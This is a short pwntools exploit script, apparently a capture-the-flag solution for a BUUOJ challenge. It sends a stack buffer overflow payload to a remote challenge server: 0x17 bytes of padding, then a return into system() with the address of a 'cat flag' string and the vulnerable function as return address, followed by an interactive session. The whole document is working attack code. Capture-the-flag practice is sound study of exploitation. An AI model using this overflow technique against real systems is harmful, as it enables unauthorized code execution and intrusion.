from pwn import *

r = remote('node5.buuoj.cn', 29994)

context.log_level = 'debug'

cat_flag_addr = 0x80487E0
system_addr = 0x8048440
vuln_addr = 0x80485D0

payload = b'A' * (0x13 + 4) + p32(system_addr) + p32(vuln_addr) + p32(cat_flag_addr)
r.sendline(payload)
r.interactive()
